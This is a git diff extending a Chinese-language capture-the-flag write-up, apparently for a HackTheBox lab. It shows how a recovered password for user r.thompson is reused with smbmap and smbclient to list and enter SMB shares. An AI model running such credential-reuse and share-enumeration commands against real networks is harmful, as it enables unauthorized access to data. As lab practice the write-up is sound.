@@ -113,7 +113,33 @@ crackmapexec smb 10.129.63.72 -u username.txt -p 'rY4n5eva'
 
 <figure><img src="../../.gitbook/assets/20 (6).png" alt=""><figcaption></figcaption></figure>
 
-* 那就换个地方用这个有效凭证，使用smbmap可以&#x20;
+* 那就换个地方用这个有效凭证，使用smbmap可以登录到该账户的共享，发现几个只读的共享：
+
+```bash
+smbmap -H 10.129.63.72 -u r.thompson -p rY4n5eva
+```
+
+<figure><img src="../../.gitbook/assets/21 (4).png" alt=""><figcaption></figcaption></figure>
+
+* 可以逐个枚举看看，最感兴趣的是Data：
+
+```bash
+smbclient //10.129.63.72/Data --user r.thompson
+```
+
+<figure><img src="../../.gitbook/assets/22 (4).png" alt=""><figcaption></figcaption></figure>
+
+* 逐个枚举发现/IT可以进去：
+
+<figure><img src="../../.gitbook/assets/23 (4).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
 
 
 
